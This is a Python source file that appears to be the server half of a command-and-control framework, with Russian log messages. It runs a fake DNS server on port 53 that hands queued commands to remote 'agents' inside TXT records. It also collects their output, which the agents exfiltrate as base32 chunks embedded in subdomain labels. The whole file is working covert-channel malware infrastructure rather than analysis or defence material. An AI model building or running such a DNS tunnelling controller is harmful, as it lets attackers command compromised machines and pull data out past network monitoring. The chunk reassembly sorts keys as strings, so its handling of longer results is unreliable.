import socket
import struct
import base64
import binascii

HOST = ('127.0.0.1', 53) #server address

def decode_base32(data :str) -> str:
    data = data.upper()

    missing_padding = len(data) % 8
    if missing_padding != 0:
        data += '=' * (8 - missing_padding)
    
    try:
        decoded_bytes = base64.b32decode(data)
        return decoded_bytes.decode('utf-8')
    except(binascii.Error, UnicodeDecodeError):
        return ""

def send_answer(ans, address, agent_id, data, idx, s):
    #FORMING DNS_PACKET_ANSWER
    #forming HEADER
    flags = b'\x85\x00' #QR=1 and AA=1
    qdcount = b'\x00\x01' #count question
    ancount = b'\x00\x01' #count response
    nscount = b'\x00\x00'
    arcount = b'\x00\x00'
    header = agent_id + flags + qdcount + ancount + nscount + arcount
    #forming QUESTION
    question = data[12:(idx + 5)]
    #forming ANSWER
    name = b'\xc0\x0c' #offset for name_domain
    type_answer = b'\x00\x10' #type=TXT
    class_dns = b'\x00\x01' #class=IN 
    TTL = b'\x00\x00\x00\x00' #TTL=0sec
    rdlength = struct.pack("!H", len(ans) + 1)
    rdata = bytes([len(ans)]) + ans
    answer = name + type_answer + class_dns + TTL + rdlength + rdata

    dns_packet_answer = header + question + answer

    s.sendto(dns_packet_answer, address)


def run_dns(stop_event, task_manager):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0) as s:
        s.bind(HOST)
        print("[+/DNS] dns-слушатель работает.")
            
        result_tmp = {} #for bigger result

        while not stop_event.is_set():
            data, address = s.recvfrom(1024)

            try:
                #parse dns_packet
                agent_id = data[:2] #ID from agent
                idx = 12
                labels = []
                while True:
                    length = data[idx]
                    if length == 0:
                        break
                    labels.append(data[(idx + 1):(idx + length + 1)].decode('utf-8'))
                    idx += (length + 1)
                domain = '.'.join(labels) #domain from agent
            except Exception:
                continue

            parts = domain.split('.') #parts for domain
            if parts and parts[-1] == "":
                parts.pop()
            if not parts:
                continue

            if parts[0] == "home":
                connection = task_manager.get_connection()

                try:
                    task = task_manager.get_next_task(connection, agent_id)
                    if task is None:
                        ans = b"null"
                    else:
                        #task[0] - task_id, task[1] - task_command
                        ans = f"{task[0]}|{task[1]}|".encode('utf-8')
                        print("[+/DNS]Задача отправлена агенту.")
                    send_answer(ans, address, agent_id, data, idx, s)    

                finally:
                    connection.close()

            elif len(parts) >= 7 and parts[-4] == "r":
                task_id = parts[-5]

                if task_id not in result_tmp:
                    result_tmp[task_id] = {}

                if parts[-6] != "end":
                    result_tmp[task_id][parts[-6]] = parts[-7]
                else:
                    result_tmp[task_id][str(999)] = parts[-7]
                    result_base32_tmp = [result_tmp[task_id][i] for i in sorted(result_tmp[task_id].keys())]
                    result_base32 = "".join(result_base32_tmp)
                    del result_tmp[task_id]
                    result = decode_base32(result_base32) 
                    connection = task_manager.get_connection()
                    try:
                        task_manager.complete_task(connection, task_id, result)
                        print(f"[+/DNS] Получен результат по задаче ({task_id}).")
                    finally:
                        connection.close()

                ans = b"OK"
                send_answer(ans, address, agent_id, data, idx, s)
                    
    print("[+/DNS] dns-слушатель прекратил работу.")
